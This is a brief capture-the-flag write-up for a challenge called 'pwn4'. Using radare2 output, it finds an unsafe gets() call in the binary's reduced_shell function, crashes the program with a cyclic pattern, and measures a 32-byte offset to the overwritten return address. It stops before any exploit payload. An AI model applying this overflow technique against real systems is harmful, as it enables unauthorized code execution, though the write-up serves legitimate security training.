# pwn4 write-up (? p)

remote server found at `nc pwn.ctf.tamu.edu 4324`

----

The binary use NX security mechanism: 

````python
[0x08048490]> i~arch,canary,nx,pic,relro
arch     x86
canary   false
nx       true
pic      false
relro    partial
```

Function sym.main() has a function call to sym.reduced_shell().

````python
[0x080485ef]> pdf
            ;-- eip:
┌ (fcn) sym.reduced_shell 404
│   sym.reduced_shell ();
│           ; var int INPUT @ ebp-0x1c
│           ; CALL XREF from 0x080487a8 (main + 37)
...
│           0x08048632      83c410         esp += 0x10
│           0x08048635      83ec0c         esp -= 0xc
│           0x08048638      8d45e4         eax = [INPUT]
│           0x0804863b      50             push eax                    ; char *s
│           0x0804863c      e8cffdffff     sym.imp.gets ()             ; char*gets(char *s)
````

Function sym.reduced_shell() contains a gets call, with local_1ch variable, renamed to INPUT.

Created a pattern using `ragg2 -P 300 -r > stdin` and reopen debugger.

````python
[0xf77b7030]> dc
I am a reduced online shell
Your options are:
1. ls
2. cal
3. pwd
4. whoami
5. exit
Input> Unkown Command

child stopped with signal 11
[+] SIGNAL 11 errno=0 addr=0x41414c41 code=1 ret=0
````

````python
[0x41414c41]> wopO 0x41414c41
32
````